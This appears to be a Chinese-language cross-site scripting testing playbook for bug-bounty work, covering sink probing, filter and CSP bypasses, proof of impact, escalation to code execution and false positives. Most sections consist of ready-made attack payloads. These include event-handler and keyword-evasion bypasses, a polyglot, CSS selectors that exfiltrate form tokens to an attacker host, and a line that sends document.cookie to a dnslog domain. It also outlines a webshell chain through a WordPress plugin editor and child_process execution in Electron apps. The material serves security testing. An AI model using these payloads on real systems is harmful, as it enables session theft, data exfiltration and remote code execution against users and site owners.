## 一、探针 | 摸输入能力 + sink 上下文

1. **输入格式**:发对应格式 payload 看哪种过——纯文本(全编码,走编码绕过或换 sink)/HTML(白名单过滤)/BBCode·Markdown(转 HTML 时属性原样带过)/富文本编辑器(DOMPurify 等)。
2. **多 sink 复用**:同一字段进多个上下文(标题进 HTML 也进 `<title>`/RSS/meta),一个输入多个机会。
3. **sink 上下文**(决定闭合方式):HTML 正文(`</tag><script>`)/属性值(闭合属性 `" onmouseover=`)/JS 字符串(`</script><script>`)/URL(`javascript:`)/CSS(`<style>` 内 `expression`/`@import`/exfil)/`<base href>` 改相对 URL/`<meta http-equiv>` 跳转/SVG 独立 XML(`<svg><script>`/`<foreignObject>`/`<use href=data:>`/`<animate onbegin>`)/HTML 注释闭合(`--><script>`)/DOM(无服务端回显,盲测走 sink 探测)。
4. **转义层**:模板引擎默认转义(Django `autoescape`/Thymeleaf `text`/Vue `{{}}`/React `{}`,`v-html`/`dangerouslySetInnerHTML`/`bypassSecurityTrust` 才不转义)/富文本白名单(DOMPurify `ALLOWED_TAGS`/HTMLPurifier)/输出编码(`htmlspecialchars` 默认只编码 `<>&"`,**不编码 `'`**)。
5. **能力边界**:能写哪些标签/事件?`onerror`/`onload` 被剥?`alert`/`document` 关键字拦?CSP(`Content-Security-Policy` 禁 `unsafe-inline`/`unsafe-eval`,report-only 不算拦)?
6. **多端渲染差异**:同一存储字段多端消费——Web 端 React `{}`/Vue `{{}}` 默认转义(安全),Android `loadDataWithBaseURL`/iOS WKWebView/Electron `<webview>`/Tauri 系统 WebView/小程序 `rich-text` 可能不转义或 sanitizer 不同 → 同一字段换端访问看哪端渲染原始标签;命中 Electron 端 → 走第 3 段 RCE 升级。
7. **URL 解析**:`javascript:`/`data:` 协议在 URL 字段是否被解析。

判定:能影响他人/管理员才算(只自己看 = self-xss,见误报段;管理后台预览/审核页常裸渲染未转义,用户端转义≠管理端转义,值得换管理端测);不按存储/反射/DOM 抬级。

## 二、绕过 | 基于第 1 段摸到的后端缺口对症 不是先想绕过

- **拦 `<script>`**:无 script 标签——`<img src=x onerror>`/`<svg onload>`/`<iframe srcdoc>`/`<details open ontoggle>`;事件多样化(`<body onpageshow>`/`<input autofocus onfocus>`/`<video>`/`<audio>` onerror)
- **拦 `onerror`/`onload`(剥事件)**:冷门自动事件——`oncontentvisibilityautostatechange`(配 `style=content-visibility:auto`,**未知标签 `c2xh` 也能挂**;`style` 被剥换 `input`,只需 `content-visibility:auto` 不必 `display:block`);Popover(`<button popovertarget=x>` + `<c2xl onbeforetoggle=... popover id=x>`,**需点按钮**);指针事件(`onpointerenter` + 撑大 `width=10000 height=10000`,鼠标一进触发);页面有 Layui/animate.css 现成 class → 绑 `onanimationstart` 自动触发,不写 `@keyframes`
- **允许 style 属性(全屏覆盖逼交互)**:`<a href="https://www.baidu.com" style="position:fixed;top:0;left:0;width:100vw;height:100vh;z-index:9999;font-size:5000px;display:block;">`;铺满视口用户点哪都中这链接,配合需点一下的攻击(CSRF 扫码确认/OAuth 授权/诱导跳外站)
- **允许 `<style>` 标签(CSS 数据外带)**:`<style>input[value^=a]{background:url(//attacker/?a)}input[value^=b]{...}</style>` 逐字节窃表单值(CSRF token/隐藏域);`expression()`/`behavior:url()` IE 老忽略
- **拦 `alert`/`document` 关键字**:内联作用域 `a=alert,a(cookie)`(内联事件里 `cookie`=`document.cookie`、`URL`=`document.URL`);标签模板 `` eval.call`${'al\x65rt(1)'}` ``(`\x65`=`e` 躲字面 `alert`);`javascript:` 当 JS label(`javascript:alert(1)` 中 `javascript:` 是 label 不是协议)
- **拦 `<>`/标签被剥**:换白名单标签(`input`/`p`);URL 编码(`<svg%20id%3dmySvg%20onpointerenter%3d...>`);反引号代引号(`` <img src=`x` onerror=...> ``)
- **允许 `<base>`(标签被剥但 base 未禁)**:`<base href="https://attacker/">` → 页面相对脚本 `<script src=app.js>` 加载 `attacker/app.js`;或 `<base target=` 改表单提交目标
- **编码绕过**:HTML 实体(`&#97;&#108;&#101;&#114;&#116;(1)`)、JS unicode(`alert`)、注释分割(`<scr<!---->ipt>`)、双重 URL 编码
- **富文本/BBCode 转 HTML**:`[p]`/`[[p]]`/`[div]` 转标签时属性原样带过 → `[[p oncontentvisibilityautostatechange=alert(1) style=content-visibility:auto][/p]]`、`[div onmousemove=eval.call\`${'al\x65rt(1)'}\` style=position:fixed;top:0;left:0;width:100%;height:100%;z-index:9999][/div]`(`onmousemove` 需滑鼠标,`position:fixed` 铺满让鼠标一动触发)
- **Markdown 注入**(同 BBCode 思路):`[xss]:javascript:alert(1)` 链接定义注入(渲染时 `[][xss]` 触发);Markdown 允许原生 HTML 时直接 `<script>`
- **CSP 禁 `unsafe-inline`**:走 JSONP endpoint(找 `callback=` 回显)/nonce 复用或泄露/base-uri 注入改资源源/CSP injection(注入分号重写 policy);CSP 禁 `unsafe-eval` → 不用 `eval.call` 换事件
- **WAF 大小写/关键字**:`ScRiPt`、内联注释 `/**/`、双重编码
- **polyglot(单 payload 穿 HTML/JS/属性/URL 多上下文,最小探测)**:
  ```
  jaVasCript:/*-/*`/*`/*'/*"/**/(/* */oNcliCk=alert() )//%0D%0A%0d%0a</stYle/</titLe/</teXtarEa/</scRipt/--!>\x3csVg/<sVg/oNloAd=alert()//>\x3e
  ```
- **mXSS(突变 XSS)**:sanitizer 输出 → 浏览器 DOM 二次解析突变成可执行(`<svg>`/`<math>` namespace 切换、`<noscript>` 解析差异);sanitizer 白名单 ≠ 浏览器实际 DOM 树,测 sanitizer 后真渲染一遍再看
- **前端框架模板注入(客户端 SSTI→XSS)**:AngularJS 1.x `{{constructor.constructor('alert(1)')()}}`(`{{}}` 求值表达式可执行,2.x+ 默认转义);Vue `{{_c.constructor('alert(1)')()}}`(需非转义插值);SPA 用 Angular/Vue 时探 `{{7*7}}` 回显 49

## 三、漏洞证明 | 证危害,不止alert(1)

- **证读凭证(SRC 禁裸 `alert(1)`)**:`alert(document.cookie)` / 内联 `a=alert,a(cookie)`;证 token `alert(localStorage.getItem('token')||sessionStorage.getItem('token'))`;证域 `alert(document.domain)`(证非 self-xss)
- **外带 cookie**:Image/fetch 到 attacker;无接收端用 dnslog SRC(`document.write('<img src="http://'+document.cookie.split(';')[0].split('=')[1]+'.your-dnslog.cn">')`)
- **DOM XSS sink 探测**:`search_in_sources("innerHTML"|"document.write"|"eval("|"location.hash"|"location.search")`;DOM 源(`location.hash`/`location.search`/`document.referrer`/`window.name`/`postMessage`)

### XSS → RCE | 次,特权上下文才行;自己写 PoC,这里只给路径 

> 普通 XSS 到此为止(证到读 cookie/session = 证到危害)。只有 JS 跑在特权进程(能写插件/能调本机桥)才走 RCE 升级。

- **网页后台(WordPress 等)**:管理员会话 + 可写插件/主题编辑器入口 → 写 webshell → fetch 触发(链路:读 plugin-editor nonce → POST `newcontent=webshell` → 访问插件路径)
- **桌面客户端(Electron/CEF/企业 Git GUI)**:`nodeIntegration`/`enableRemoteModule`/暴露的 `require`·`child_process` → 探桥顺序 `typeof process` → `typeof require`(`require.toString()` 含 `native` 才当真)→ `window.require` → 预加载 `window.electron.ipcRenderer`;`require` 直 `child_process.exec('calc'/'open -a Calculator')`;老窗口走 `remote.require('child_process')`。沙箱封死 → 降级当普通存储 XSS 继续走网页,不算此路废

### 自定义协议 → RCE | 不必先有存储 XSS

- macOS `Info.plist` `CFBundleURLSchemes`/Windows 注册协议/JS `setAsDefaultProtocolClient` → 协议参数出现 `url`/`openUrl`/`webview`/`open` 填外站地址(两种形态:JSON `scheme://app/open?params={"url":"..."}` / 扁平 `scheme://openUrl?url=...`);浏览器地址栏或 `href` 打开,系统问"打开该应用",对方点一次即算合理交互

## 四、误报

- 只换标签名、属性被剥 / 转出来纯文本 / 没滑鼠标 / `style` 被剥只剩小块要精确悬停 / CSP 禁 `eval` → 冷门事件也走不通,不算注入成功
- `alert(1)` 能触发但只是 self-xss(只自己的页/自己的存储,无他人受影响)→ 不是洞
- 只在浏览器 alert、桌面客户端不渲染外站、只弹"打开应用"但不加载外站页、跳转但没执行 → 停在调起/存储 XSS,勿判 RCE
- 协议只开自家域、`require` 和 `remote` 都没有 → 自定义协议此路不通,改走投递 1(存储 XSS)或网页面
- CSP report-only(header 带 `-Report-Only`)不算拦
- 框架默认转义生效(React `{}`/Vue `{{}}`/Django `autoescape`)→ 输入被编码不是漏(除非走 `dangerouslySetInnerHTML`/`v-html`/`bypassSecurityTrust`)
